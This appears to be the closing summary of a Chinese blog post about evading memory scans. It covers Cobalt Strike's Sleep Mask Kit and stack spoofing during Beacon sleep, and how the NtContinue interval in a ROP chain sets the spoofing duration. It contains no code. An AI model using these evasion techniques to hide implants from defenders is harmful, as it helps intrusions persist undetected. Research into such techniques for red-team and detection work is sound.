<h4 data-content="1" id="2a115359d4bfc656f70b5cc35d62a4ee">总结</h4>
<p>这里先伪造后复原，主要目的是，隐藏sleep期间的内存扫描。<br/>
cabaltstrike sleep mask的激活时间可以由用户在profile中设定，比如只有当sleep时间大于2秒，才会启动mask和unmask</p>
<blockquote>
<p>For this example, the Sleep Mask Kit for Cobalt Strike version 4.5 with a modification to the code to only mask and unmask when the sleep is larger than two seconds will be used. This allows for the ability to control the masking and unmasking of Beacon based on the current sleep time.</p>
</blockquote>
<p>详情见<br/>
<a href="https://www.cobaltstrike.com/blog/sleep-mask-update-in-cobalt-strike-4-5" target="_blank">https://www.cobaltstrike.com/blog/sleep-mask-update-in-cobalt-strike-4-5</a><br/>
堆栈欺骗的时间长度，我们可以自己更改，通过修改ROP链NtContinue那里的时间间隔。</p>
</div>
</div>